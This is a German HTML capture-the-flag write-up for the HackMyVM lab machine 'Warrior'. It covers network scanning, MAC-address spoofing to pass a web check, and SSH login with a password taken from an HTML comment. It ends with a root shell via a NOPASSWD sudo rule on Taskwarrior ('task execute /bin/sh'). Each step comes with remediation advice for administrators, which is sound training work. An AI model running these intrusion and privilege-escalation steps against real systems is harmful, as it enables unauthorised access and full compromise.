@@ -1,0 +1,442 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warrior - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün/Lime) enthalten -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Warrior - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe 'lime' durch CSS -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmentfarben 'lime' durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe durch CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl (impliziert) / Browser</div>
+                <div class="tool-item">ifconfig</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">sudo (mit absolutem Pfad)</div>
+                <div class="tool-item">task (via sudo)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-information-gathering">Web Information Gathering</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#privilege-escalation-prep">Privilege Escalation Preparation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via Sudo Task)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Beginn der Aufklärung mit `arp-scan -l` zur Identifizierung aktiver Hosts im lokalen Netzwerksegment.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.107	08:00:27:76:93:b9	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.107 wurde entdeckt. Die MAC-Adresse weist auf eine VirtualBox VM hin. Dies ist das Zielsystem "Warrior".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf 192.168.2.107 durch. Da spätere Befehle den Hostnamen `warrior.vm` verwenden, fügen Sie diesen zur lokalen `/etc/hosts`-Datei hinzu (`192.168.2.107 warrior.vm`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standardempfehlungen zur Netzwerküberwachung und Segmentierung.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird auf das Ziel 192.168.2.107 gestartet, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln. Verwendete Optionen: `-sS` (SYN Scan), `-sC` (Standard Skripte), `-T5` (schnelles Timing), `-A` (Aggressiv: OS-Erkennung, Versionen, Skripte, Traceroute), `-p-` (alle TCP-Ports).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.107 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-09 14:15 CET
+Nmap scan report for warrior (192.168.2.107)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 25168d636b75f05955d4b02d758de0e6 (RSA)
+|   256 1e29d0f4c595e740302b35f7a3bc3675 (ECDSA)
+|_  256 ccb152b3d7efcd734cfcf6b55177eaf3 (ED25519)
+80/tcp open  http    nginx 1.18.0
+| http-robots.txt: 7 disallowed entries
+| /admin /secret.txt /uploads/id_rsa /internal.php
+|_/internal /cms /user.txt
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:76:93:B9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms warrior (192.168.2.107)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
+                    </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Zwei offene Ports gefunden:
+                *   **Port 22 (SSH):** OpenSSH 8.4p1 auf Debian.
+                *   **Port 80 (HTTP):** nginx 1.18.0.
+                Der **wichtigste Fund** ist die Ausgabe des Nmap-Skripts `http-robots.txt`: Es listet mehrere "Disallowed"-Einträge auf, die oft auf versteckte oder sensible Pfade hinweisen: `/admin`, `/secret.txt`, `/uploads/id_rsa`, `/internal.php`, `/internal`, `/cms`, `/user.txt`. Diese Pfade sind nun die primären Ziele für die weitere Untersuchung.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Rufen Sie alle in `robots.txt` gefundenen Pfade manuell über einen Browser oder `curl` auf, insbesondere `/secret.txt`, `/internal.php` und `/user.txt`. Untersuchen Sie auch `/admin`, `/internal` und `/cms`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Seien Sie vorsichtig, welche Pfade in `robots.txt` eingetragen werden. Obwohl es Suchmaschinen anweist, diese Pfade nicht zu indexieren, dient es Angreifern oft als Roadmap zu potenziell interessanten Bereichen. Sensible Dateien oder administrative Schnittstellen sollten durch Zugriffskontrollen (Authentifizierung, IP-Beschränkungen) geschützt werden, nicht nur durch `robots.txt`. Entfernen Sie unnötige Einträge oder Dateien.
+            </p>
+        </section>
+
+        <section id="web-information-gathering">
+            <h2>Web Information Gathering</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die in der `robots.txt` gefundenen Pfade werden über einen Browser (oder `curl`) aufgerufen, um deren Inhalt zu ermitteln.
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Browser-Aktionen -->
+                 <pre>
+--- Request: http://192.168.2.107/user.txt ---
+loco
+</pre><hr><pre>
+--- Request: http://192.168.2.107/robots.txt ---
+User-agent: *
+Disallow:/admin
+Disallow:/secret.txt
+Disallow:/uploads/id_rsa
+Disallow:/internal.php
+Disallow:/internal
+Disallow:/cms
+Disallow:/user.txt
+</pre><hr><pre>
+--- Request: http://192.168.2.107/secret.txt ---
+0123456789ABCDEF
+</pre><hr><pre>
+--- Request: http://192.168.2.107/index.html ---
+WARRIR
+<- YEAH ->
+</pre><hr><pre>
+--- Request: http://192.168.2.107/internal.php ---
+Hey bro, you need to have an internal MAC as 00:00:00:00:00:a? to read your pass.
+                 </pre>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Untersuchung der Dateien liefert entscheidende Hinweise:
+                *   `user.txt`: Enthält das Wort "loco". Könnte ein Benutzername oder Hinweis sein.
+                *   `robots.txt`: Bestätigt die zuvor gefundenen Pfade.
+                *   `secret.txt`: Enthält die Zeichenkette "0123456789ABCDEF". Könnte ein Schlüssel, Teil eines Passworts oder ein Hinweis sein.
+                *   `index.html`: Enthält nur einfachen Text "WARRIR <- YEAH ->".
+                *   `internal.php`: **Sehr wichtig!** Enthält eine Nachricht, die auf einen Benutzer "bro" hindeutet ("Hey bro,...") und eine Bedingung für den Zugriff auf ein Passwort stellt: Die MAC-Adresse des zugreifenden Clients muss mit `00:00:00:00:00:a?` übereinstimmen (wobei `?` ein beliebiges Zeichen ist).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der klare nächste Schritt ist das Spoofing der eigenen MAC-Adresse, sodass sie dem Muster `00:00:00:00:00:aX` (z.B. `00:00:00:00:00:af`) entspricht. Rufen Sie danach `internal.php` erneut auf, um das Passwort für den Benutzer `bro` zu erhalten. Der Inhalt von `secret.txt` könnte später relevant werden oder ist eine falsche Fährte.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie niemals Sicherheitskontrollen, die ausschließlich auf clientseitigen Informationen wie der MAC-Adresse basieren. MAC-Adressen können leicht gefälscht werden. Verwenden Sie stattdessen robuste serverseitige Authentifizierung und Autorisierung. Entfernen Sie Skripte wie `internal.php` und sensible Dateien wie `secret.txt` und `user.txt` aus dem Web-Root.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester erkennt, dass die eigene MAC-Adresse geändert werden muss, um die Bedingung in `internal.php` zu erfüllen. Die MAC-Adresse wird auf dem Kali/Cyber-System mittels `ifconfig` auf `00:00:00:00:00:AF` gesetzt. Das Interface `eth0` wird dazu heruntergefahren, die MAC geändert und das Interface wieder hochgefahren.
+            </p>
+            <!-- Kommentar zur Änderung der MAC-Adresse -->
+             <p class="analysis">
+                 <strong>Analyse Ergänzung:</strong> Die Notiz "Das hat nicht geklappt, ich muss es in der VM Virualbox Einstellungen ändern" deutet darauf hin, dass das `ifconfig`-Spoofing möglicherweise nicht ausreichte oder nicht korrekt funktionierte und die MAC-Adresse direkt in den VirtualBox-Einstellungen der Angreifer-VM geändert werden musste. Der Bericht fährt jedoch mit den `ifconfig`-Befehlen fort. Es wird angenommen, dass eine dieser Methoden funktionierte.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ifconfig eth0 down</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ifconfig eth0 hw ether 00:00:00:00:00:AF</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ifconfig eth0 up</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die MAC-Adresse wurde erfolgreich geändert (entweder per `ifconfig` oder in den VM-Einstellungen). Die Voraussetzung für den Zugriff auf das Passwort in `internal.php` ist nun erfüllt.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Rufen Sie `internal.php` erneut auf.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verlassen Sie sich nicht auf MAC-Adressen zur Authentifizierung oder Autorisierung.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach der MAC-Adressen-Änderung wird `internal.php` erneut aufgerufen. Die Seite zeigt nun "Good!!!!!". Anschließend wird der Quellcode dieser Seite angezeigt, der das Passwort im Klartext enthält.
+            </p>
+            <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Browser-Aktion -->
+                 <pre>
+--- Request: http://192.168.2.107/internal.php ---
+Good!!!!!
+
+--- Request: view-source:http://192.168.2.107/internal.php ---
+Good!!!!!<!-- Your password is: <span class="password">Zurviv0r1</span> -->
+                 </pre> <!-- Passwort als Klartext im HTML-Kommentar -->
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die MAC-Adressprüfung wurde erfolgreich umgangen. Das Passwort für den Benutzer `bro` lautet `<span class="password">Zurviv0r1</span>` und wurde aus einem HTML-Kommentar im Quellcode extrahiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie die Anmeldedaten `bro` / `<span class="password">Zurviv0r1</span>` für den SSH-Login auf Port 22.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie Passwörter aus dem Quellcode und aus HTML-Kommentaren. Beheben Sie die unsichere MAC-Adress-Prüfung. Verwenden Sie sichere Methoden zur Passwortverwaltung.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Zusammenfassung der gefundenen SSH-Anmeldedaten und anschließender SSH-Login-Versuch mit `ssh bro@warrior.vm`. Das Passwort `<span class="password">Zurviv0r1</span>` wird eingegeben.
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, Notizblock -->
+                 <pre>
+username ssh: bro
+passwort ssh: <span class="password">Zurviv0r1</span>
+                 </pre>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh bro@warrior.vm</span></div>
+                    <pre>
+bro@warrior.vm's password: <span class="password">Zurviv0r1</span>
+Linux warrior 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSLUTELY N WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb  8 04:03:20 2022 from 192.168.1.51
+bro@warrior:~$
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Initial Access erfolgreich!** Der SSH-Login als Benutzer `bro` war erfolgreich.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie grundlegende Enumeration als `bro` durch (`id`, `pwd`, `ls -la`, `cat user.txt`). Suchen Sie nach Wegen zur Rechteausweitung (`sudo -l`, SUID-Dateien, Capabilities etc.).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort von `bro`. Beheben Sie die Schwachstellen, die zur Preisgabe des Passworts führten (MAC-Filter, Passwort im Kommentar). Implementieren Sie starke Passwörter und idealerweise Key-basierte SSH-Authentifizierung.
+            </p>
+        </section>
+
+        <section id="privilege-escalation-prep">
+             <h2>Privilege Escalation Preparation</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem SSH-Login wird das Home-Verzeichnis des Benutzers `bro` untersucht und die `user.txt`-Datei gelesen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">bro@warrior:~$ <span class="command">ls</span></div>
+                    <pre>user.txt</pre>
+                    <div class="prompt" style="color: yellow;">bro@warrior:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">LcHHbXGHMVhCpQHvqDen</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die User-Flag wurde gefunden und ausgelesen.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die User-Flag. Fahren Sie mit der Suche nach Privilegienerweiterungsvektoren fort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine spezifischen Maßnahmen für die Flag selbst.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, `sudo -l` auszuführen, um die Sudo-Berechtigungen zu prüfen, was fehlschlägt ("command not found"). Anschließend wird mit `find` nach SUID-Dateien gesucht.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">bro@warrior:~$ <span class="command">sudo -l</span></div>
+                    <pre>-bash: sudo: command not found</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">bro@warrior:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   276174    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/sbin/sudo
+   263317     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount
+   259677     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
+   261402     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su
+   263166     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
+   263316     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount
+   259679     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
+   259680     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
+   259676     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
+   271344     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   138380    472 -rwsr-xr-x   1 root     root         481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> `sudo` ist nicht im Standard-PATH des Benutzers `bro` enthalten. Die `find`-Ausgabe zeigt jedoch, dass `sudo` als SUID-Datei unter `/usr/sbin/sudo` existiert. Dies ist der Schlüssel zur Überprüfung der Sudo-Rechte. Die anderen SUID-Dateien sind Standard und wahrscheinlich nicht direkt ausnutzbar.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -l` mit dem vollen Pfad aus: `/usr/sbin/sudo -l`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der `PATH` für Benutzer korrekt konfiguriert ist, oder weisen Sie Benutzer an, bei Bedarf volle Pfade zu verwenden. Überprüfen Sie die Notwendigkeit und Konfiguration von SUID-Dateien.
+            </p>
+
+            <!-- Vergleich der PATH-Variablen - übersprungen, da nicht direkt relevant für den weiteren Verlauf -->
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `sudo -l` wird nun mit dem korrekten Pfad `/usr/sbin/sudo` ausgeführt, um die Sudo-Berechtigungen für `bro` zu ermitteln.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">bro@warrior:~$ <span class="command">cd /usr/sbin/</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt" style="color: yellow;">bro@warrior:/usr/sbin$ <span class="command">/usr/sbin/sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for bro on warrior:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bro may run the following commands on warrior:
+    (root) NOPASSWD: /usr/bin/task
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund für Privilege Escalation!** Der Benutzer `bro` darf den Befehl `/usr/bin/task` als `root` **ohne Passwort** (`NOPASSWD`) ausführen. Der `task`-Befehl (Taskwarrior) kann zur Ausführung beliebiger Shell-Befehle missbraucht werden.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo task`-Berechtigung zur Rechteausweitung. Recherchieren Sie die Methode auf GTFOBins oder anderen Quellen. Führen Sie `/usr/sbin/sudo /usr/bin/task execute /bin/sh` aus.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie die unsichere `sudoers`-Regel `(root) NOPASSWD: /usr/bin/task`. Gewähren Sie `sudo`-Rechte nur für absolut notwendige Befehle und vermeiden Sie `NOPASSWD`, insbesondere für Befehle, die zur Shell-Ausführung missbraucht werden können.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Privilege Escalation via Sudo Task)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Die gefundene `sudo`-Regel wird ausgenutzt. Der Befehl `/usr/bin/task` wird mit `sudo` (über den vollen Pfad `/usr/sbin/sudo`) aufgerufen. Die `execute`-Option von `task` wird verwendet, um einen neuen Shell-Prozess (`/bin/sh`) zu starten. Da `task` als `root` läuft, wird auch die neue Shell mit Root-Rechten gestartet. Der `id`-Befehl wird in der neuen Shell ausgeführt, um die Rechte zu bestätigen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">bro@warrior:/usr/sbin$ <span class="command">/usr/sbin/sudo /usr/bin/task execute /bin/sh</span></div>
+                     <pre>
+# <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+                     </pre> <!-- Prompt wechselt zu root (#) -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Die unsichere `sudo`-Konfiguration für `task` wurde erfolgreich ausgenutzt, um eine Root-Shell zu erhalten.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätigen Sie die Identität und lesen Sie die Root-Flag. Führen Sie Post-Exploitation-Aufgaben durch.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die `sudoers`-Schwachstelle. Überprüfen Sie alle `sudo`-Regeln auf ähnliche Risiken.
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /home/bro/user.txt</div>
+                     <div class="flag-value"><span class="password">LcHHbXGHMVhCpQHvqDen</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HPiGHMVcDNLlXbHLydMv</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der Root-Shell wird das Root-Verzeichnis aufgesucht und die Root-Flag (`root.txt`) gelesen. Die User-Flag wurde bereits zuvor als `bro` gelesen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">pwd</span></div>
+                     <pre>/usr/sbin</pre>
+                     <div class="prompt"># <span class="command">cd</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt"># <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt"># <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">HPiGHMVcDNLlXbHLydMv</span></pre>
+                 </div>
+             </div>
+             <!-- User-Flag wurde bereits als 'bro' gelesen -->
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags wurden erfolgreich gefunden und ausgelesen. Das Ziel der Übung ist erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und schließen Sie den Bericht ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konzentrieren Sie sich auf die Behebung der Schwachstellen: Informationspreisgabe durch `robots.txt`, unsichere MAC-Adress-Prüfung in `internal.php`, Passwort im HTML-Kommentar, unsichere `sudo`-Regel für `task`.
+            </p>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-11-09</p> <!-- Datum aus Nmap -->
+    </footer>
+</body>
+</html>
